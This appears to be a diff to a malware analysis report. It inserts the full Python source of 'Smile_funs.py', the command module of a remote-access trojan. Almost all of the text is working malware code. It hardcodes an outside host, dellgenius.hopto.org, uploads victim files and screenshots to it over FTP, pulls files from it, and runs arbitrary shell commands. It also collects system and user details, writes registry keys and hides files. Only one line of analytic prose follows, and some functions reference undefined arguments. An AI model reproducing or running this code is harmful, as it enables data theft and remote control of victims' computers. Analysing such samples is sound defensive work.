@@ -520,8 +520,541 @@ encrypting/decrypting function used
 
 ## **Smile_funs.py**
 
-Source code was attached alongside the report because of its extreme
-length.
+```vbscript
+import argparse
+import glob
+import os
+import platform
+import shlex
+import shutil
+import stat
+import sys
+import time
+import winreg
+import zipfile
+from ftplib import FTP
+from getpass import getuser
+from random import uniform
+from subprocess import Popen, PIPE
+
+import chardet
+import mss
+from tabulate import tabulate
+
+from affine import Affine
+
+RHOST = "dellgenius.hopto.org"
+me = sys.argv[0]
+fold = me[:me.rfind("\\") + 1]
+pipe_out = fold + "Abibliophobia23"
+processes = []
+
+
+############ Internal ############
+class ArgumentParser(argparse.ArgumentParser):
+    def error(self, message):
+        args = {'prog': self.prog, 'message': message}
+        raise AttributeError(self.format_help() + '\n%(prog)s: error: %(message)s\n' % args)
+
+    def exit(self, status=0, message=None):
+        if message:
+            raise Exception(message)
+
+    def print_usage(self, file=None):
+        if file is None:
+            raise Exception(self.format_usage())
+        else:
+            self._print_message(self.format_usage(), file)
+
+    def print_help(self, file=None):
+        if file is None:
+            raise Exception(self.format_help())
+        else:
+            self._print_message(self.format_help(), file)
+
+
+def execution(com):
+    args = shlex.split(com)
+    cmd = args[0]
+    args = args[1:]
+
+    if cmd == "version":
+        return "4.0"
+    elif cmd == "ls":
+        return ls(args)
+    elif cmd == "cd":
+        return chdir(args)
+    elif cmd == "sysinfo":
+        return get_sys_info()
+    elif cmd == "download":
+        return download(args)
+    elif cmd == "upload":
+        return upload_file(args)
+    elif cmd == "shot":
+        return shot(args)
+    elif cmd == "cp":
+        return copy_file_a(args)
+    elif cmd == "mv":
+        return move_file_a(args)
+    elif cmd == "link":
+        return create_link_a(args)
+    elif cmd == "register":
+        return register_a(args)
+    elif cmd == "hide":
+        return hide_file_a(args)
+    elif cmd == "compress":
+        return compress(args)
+    elif cmd == "jobs":
+        return jobs(args)
+    elif cmd == "exit":
+        return "exit"
+    else:
+        return run_cmd(com)[0]
+
+
+def copy_file(p1, p2):
+    if os.path.isfile(p1):
+        shutil.copy2(p1, p2)
+    else:
+        shutil.copytree(p1, p2)
+
+
+def move_file(p1, p2):
+    shutil.move(p1, p2)
+
+
+def hide_file(file):
+    run_cmd("attrib +h +r +s ".format(file), False)
+
+
+def unhide_file(file):
+    run_cmd("attrib -h -r -s ".format(file), False)
+
+
+def registry(owner, path, name, value, value_type):
+    key = winreg.CreateKey(owner, path)
+    time.sleep(uniform(5, 20))
+    winreg.SetValueEx(key, name, 0, value_type, value)
+    time.sleep(uniform(5, 10))
+    winreg.CloseKey(key)
+
+
+def create_link(p1, p2):
+    os.link(p1, p2)
+
+
+def remove_link(p1):
+    os.unlink(p1)
+
+
+def file_ready():
+    open(pipe_out + ".ready", "w+").write('0')
+
+
+def waiting_file():
+    while open(pipe_out + ".ready", "r").read() != '1':
+        time.sleep(0.5)
+
+
+def init_ftp(username, password, directory):
+    if password is None:
+        aff = Affine()
+        open(pipe_out, "w").write(aff.encrypt("Pass?\n"))
+        file_ready()
+
+        waiting_file()
+        password = aff.decrypt(str(open(pipe_out, "r").read().rstrip()))
+
+    ftp = FTP(RHOST)
+    ftp.login(username, password)
+    ftp.cwd(directory)
+    return ftp
+
+
+def ftp_arg_parse(com, source):
+    ap = ArgumentParser(source)
+    if source != "shot":
+        ap.add_argument("-f", action="store", required=True, type=str)
+    ap.add_argument("-u", action="store", type=str, default="smile")
+    ap.add_argument("-p", action="store", type=str, default=None)
+    ap.add_argument("-d", action="store", type=str, default="files")
+    args = vars(ap.parse_args(com))
+    return args
+
+
+def download_file(ftp, resp, file):
+    with open(file, 'rb') as fp:
+        resp += "{}: ".format(file)
+        try:
+            rest_pos = ftp.size(file)
+        except:
+            rest_pos = 0
+        fp.seek(rest_pos, 0)
+        resp += (ftp.storbinary("STOR " + file, fp, rest=rest_pos) + "\n")
+    return resp
+
+
+def fix_coding(data, new_coding="utf-8"):
+    if len(data) == 0:
+        return ""
+    encoding = chardet.detect(data)['encoding']
+    if new_coding.upper() != encoding.upper():
+        data = data.decode(encoding)
+
+    return data
+
+
+def work_on_cmd_process(command, dick):
+    dick.send(work_on_cmd(command))
+    dick.close()
+
+
+def work_on_cmd(command):
+    piper = command.split("|")
+    com = piper[0].strip()
+
+    try:
+        resp = execution(com)
+    except Exception as e:
+        resp = str(e)
+    if len(piper) == 1:
+        return resp
+    else:
+        return work_on_cmd(piper[1] + " " + shlex.quote(resp) + "|".join(piper[2:]))
+
+
+def cut_len(line, m=10):
+    temp = ""
+    for bla in range(int(len(line) / m) + 1):
+        temp += line[bla * m:(bla + 1) * m].strip() + "\n"
+    return temp if temp != "" else line
+
+
+def list_processes():
+    header = ["Name", "Is Alive?", "Invoke Dir"]
+    data = []
+    for x in processes:
+        data.append([cut_len(x["process"].name, 50), x["process"].is_alive(), cut_len(x["root"], 27)])
+    return tabulate(data, header, stralign="left", showindex="always", tablefmt="fancy_grid")
+
+
+def clear_processes(key):
+    if key is not None:
+        if not processes[key]["process"].is_alive():
+            processes.pop(key)
+            return "Cleared"
+        else:
+            return "Can't clear running process"  # Actually I can, but should I?
+    else:
+        x = 0
+        for k in range(len(processes)):
+            if clear_processes(x) != "Cleared":
+                x += 1
+        return "Cleared"
+
+
+def output_process(key):
+    px = processes[key]
+    d = px["receiver"]
+    if d.poll(timeout=1):
+        px["data"] += d.recv()
+    return px["data"]
+
+
+def kill_process(key):
+    try:
+        processes[key]["process"].kill()
+    except Exception as e:
+        return "Could not kill him: " + str(e)
+    return "Killed );"
+
+
+def terminate_process(key):
+    try:
+        processes[key]["process"].terminate()
+    except Exception as e:
+        return "Could not terminate him: " + str(e)
+    return "Terminated /:"
+
+
+def close_process(key):
+    try:
+        processes[key]["process"].close()
+        processes.pop(key)
+    except Exception as e:
+        return "Could not close him: " + str(e)
+    return "Closed |:"
+
+
+############ External ############
+def jobs(com):
+    ap = ArgumentParser("jobs")
+    action = ap.add_subparsers(dest="action")
+    a_clear = action.add_parser("clear")
+    a_output = action.add_parser("output")
+    a_kill = action.add_parser("kill")
+    a_term = action.add_parser("terminate")
+    a_close = action.add_parser("close")
+
+    a_clear.add_argument("index", action="store", type=int, nargs="?")
+    a_clear.set_defaults(act=clear_processes)
+
+    a_output.add_argument("index", action="store", type=int)
+    a_output.set_defaults(act=output_process)
+
+    a_kill.add_argument("index", action="store", type=int)
+    a_kill.set_defaults(act=kill_process)
+
+    a_term.add_argument("index", action="store", type=int)
+    a_term.set_defaults(act=terminate_process)
+
+    a_close.add_argument("index", action="store", type=int)
+    a_close.set_defaults(act=close_process)
+
+    args = vars(ap.parse_args(com))
+    if args["action"] is not None:
+        return args['act'](args["index"])
+    else:
+        return list_processes()
+
+
+def ls(com):
+    ap = ArgumentParser(prog="ls")
+    ap.add_argument("i", action="store", type=int, nargs="?")
+    args = vars(ap.parse_args(com))
+
+    if args['i'] is not None:
+        return os.listdir(".")[int(args['i'])]
+    else:
+        data = []
+        header = ["Mode", "Size", "Creation", "Modification", "Name"]
+        for x in os.listdir("."):
+            x_stat = os.stat(x)
+            data.append(
+                [stat.filemode(x_stat.st_mode), x_stat.st_size, cut_len(time.ctime(x_stat.st_ctime), 20),
+                 cut_len(time.ctime(x_stat.st_mtime), 20), cut_len(x, 30)])
+        return tabulate(data, header, stralign="left", showindex="always",
+                        tablefmt="simple") + "\n||| " + os.getcwd() + " ||| "
+
+
+def compress(com):
+    ap = ArgumentParser(prog="compress")
+    ap.add_argument("-d", action="store", type=str, required=True)
+    ap.add_argument("-t", action="store", type=str, required=True)
+    ap.add_argument("-c", action="store", type=int, required=False)
+    ap.add_argument("-l", action="store", type=int, required=False, default=None)
+    args = vars(ap.parse_args(com))
+
+    arch = args['d']
+    targets = args['t'].split(",")
+    level = args['l']
+
+    with zipfile.ZipFile(arch, "w") as zipper:
+        for glob_path in targets:
+            for one in glob.iglob(glob_path.lstrip(), recursive=True):
+                if os.path.isdir(one):
+                    for folder, subfolder, files in os.walk(one):
+                        for x in files:
+                            p = os.path.join(folder, x)
+                            zipper.write(p, os.path.relpath(p, one + "/.."), compress_type=zipfile.ZIP_LZMA,
+                                         compresslevel=level)
+                else:
+                    zipper.write(one, os.path.relpath(one), compress_type=zipfile.ZIP_LZMA, compresslevel=level)
+
+    if args["c"] is None:
+        return "Compressed " + str(os.stat(arch).st_size / 1024 / 1024) + "Mb to " + os.path.abspath(arch)
+
+    chapters = split_file(arch, args['-c'])
+    os.remove(arch)
+    return "Compressed to " + str(chapters + 1) + " chunks in " + os.path.abspath(arch + '0/..')
+
+
+def split_file(file, size):
+    chunk_size = size * 1024 * 1024
+    buf = 100 * 1024 * 1024
+    chapters = 0
+    ugly_buf = ''
+    with open(file, 'rb') as src:
+        while True:
+            tgt = open(file + '.%1d' % chapters, 'wb')
+            written = 0
+            while written < chunk_size:
+                if len(ugly_buf) > 0:
+                    tgt.write(ugly_buf)
+                tgt.write(src.read(min(buf, chunk_size - written)))
+                written += min(buf, chunk_size - written)
+                ugly_buf = src.read(1)
+                if len(ugly_buf) == 0:
+                    break
+            tgt.close()
+            if len(ugly_buf) == 0:
+                break
+            chapters += 1
+    return chapters
+
+
+def chdir(com):
+    ap = ArgumentParser("cd")
+    ap.add_argument("path", action="store", default="~", type=str)
+    to = vars(ap.parse_args(com))["path"]
+    os.chdir(os.path.expanduser(to))
+    return "Changed directory to {}".format(os.getcwd())
+
+
+def download(com):
+    args = ftp_arg_parse(com, "download")
+
+    filename = args["f"]
+
+    ftp = init_ftp(username=args["u"], password=args["p"], directory=args["d"])
+    ftp.voidcmd("TYPE I")
+    resp = ""
+    for p in glob.iglob(filename, recursive=True):
+        if os.path.isdir(p):
+            for folder, subfolder, files in os.walk(p):
+                for file in files:
+                    resp = download_file(ftp, resp, file)
+        else:
+            resp = download_file(ftp, resp, p)
+    ftp.quit()
+    return resp
+
+
+def upload_file(com):
+    args = ftp_arg_parse(com, "upload")
+    filename = args["f"]
+    file = filename[filename.rfind("/") + 1:]
+    with open(file, "wb") as fp:
+        ftp = init_ftp(username=args["u"], password=args["p"], directory=args["d"])
+        resp = (ftp.retrbinary("RETR " + filename, fp.write) + "\n")
+    ftp.quit()
+    fp.close()
+    return resp
+
+
+def shot(com):
+    args = ftp_arg_parse(com, "shot")
+    with mss.mss() as sct:
+        f = sct.shot()
+    with open(f, "rb") as s_shot:
+        ftp = init_ftp(username=args["u"], password=args["p"], directory=args["d"])
+        resp = (ftp.storbinary(
+            "STOR " + "shot_{0}_{1}.png".format(str(platform.node()).replace(" ", "_"),
+                                                time.time()), s_shot) + "\n")
+    s_shot.close()
+    os.remove(f)
+    sct.close()
+    ftp.quit()
+    return resp
+
+
+def get_sys_info():
+    sysinfo = f"""
+Operating System: {platform.system()}
+Computer Name: {platform.node()}
+Username: {getuser()}
+Release Version: {platform.release()}
+Processor Architecture: {platform.processor()}
+    """
+    return sysinfo
+
+
+def task_running(name):
+    res = run_cmd("tasklist /v /fo csv /fi \"IMAGENAME eq {}\"".format(name))
+    return res[0].count(name) if res[1] else False
+
+
+def task_kill(name):
+    return run_cmd("taskkill /f /im \"{}\"".format(name))[1]
+
+
+def run_cmd(cmd, wait=True):
+    if not wait:
+        Popen(cmd, shell=True)
+        return "", True
+    comm = Popen(cmd, shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
+    stdout, stderr = comm.communicate()
+    if not stdout:
+        return fix_coding(stderr), False
+    return fix_coding(stdout), True
+
+
+def copy_file_a(cmd):
+    ap = ArgumentParser("cp")
+    ap.add_argument("from", action="store", type=str)
+    ap.add_argument("to", action="store", type=str)
+    args = vars(ap.parse_args(cmd))
+    copy_file(args["from"], args["to"])
+    return "{0} has been copied to {1}".format(args["from"], args["to"])
+
+
+def move_file_a(cmd):
+    ap = ArgumentParser("mv")
+    ap.add_argument("what", action="store", type=str)
+    ap.add_argument("where", action="store", type=str)
+    args = vars(ap.parse_args(cmd))
+    move_file(args["what"], args["where"])
+    return "{0} has been moved to {1}".format(args["from"], args["to"])
+
+
+def create_link_a(cmd):
+    ap = ArgumentParser("link")
+    ap.add_argument("from", action="store", type=str)
+    ap.add_argument("where", action="store", type=str, nargs="?")
+    ap.add_argument("-del", action="store_true")
+    args = vars(ap.parse_args(cmd))
+
+    if args["del"]:
+        remove_link(args["from"])
+        return "Link to {} has been removed".format(args["from"])
+    else:
+        if not args["where"]:
+            return ap.print_usage()
+        create_link(args["from"], args["where"])
+        return "Link from {} to {} has been created".format(args["from"], args["where"])
+
+
+def register_a(cmd):
+    ap = ArgumentParser("register")
+    ap.add_argument("-o", type=str, required=True, help="The Reg key root",
+                    choices=["ClsRoot", "CurUs", "DynData", "LocMach", "PerfData", "Users"])
+    ap.add_argument("-p", type=str, required=True, help="Key path under the root")
+    ap.add_argument("-n", type=str, required=True, help="Name of the new key")
+    ap.add_argument("-v", type=str, required=True, help="Value of the key")
+    ap.add_argument("-t", type=str, required=True, help="Value Type",
+                    choices=["DWord", "Link", "Binary", "QWord", "SZ", "None"])
+    args = vars(ap.parse_args(cmd))
+    owner = {
+        "ClsRoot": winreg.HKEY_CLASSES_ROOT,
+        "CurUs": winreg.HKEY_CURRENT_USER,
+        "DynData": winreg.HKEY_DYN_DATA,
+        "LocMach": winreg.HKEY_LOCAL_MACHINE,
+        "PrefData": winreg.HKEY_PERFORMANCE_DATA,
+        "Users": winreg.HKEY_USERS
+    }
+    val_type = {
+        "DWord": winreg.REG_DWORD,
+        "Link": winreg.REG_LINK,
+        "Binary": winreg.REG_BINARY,
+        "QWord": winreg.REG_QWORD,
+        "SZ": winreg.REG_SZ,
+        "None": winreg.REG_NONE
+    }
+
+    registry(owner[args["o"]], args["p"], args["n"], args["v"], val_type[args["t"]])
+    return "{0} Added to {1} registry under the name {2}".format(args["f"], owner[args["o"]] + "|" + args["p"],
+                                                                 args["n"])
+
+
+def hide_file_a(cmd):
+    ap = ArgumentParser("hide")
+    ap.add_argument("file", type=str)
+    ap.add_argument("-del", action="store_true")
+    args = vars(ap.parse_args(cmd))
+
+    unhide_file(args["file"]) if args["del"] else hide_file(args["file"])
+    return "{0} has been {1}".format(args["f"], "relieved" if args["del"] else "hidden")
+```
 
 This script defines the capabilities of the malware, because it's the
 library that was used by "**smile.py"** which is responsible for
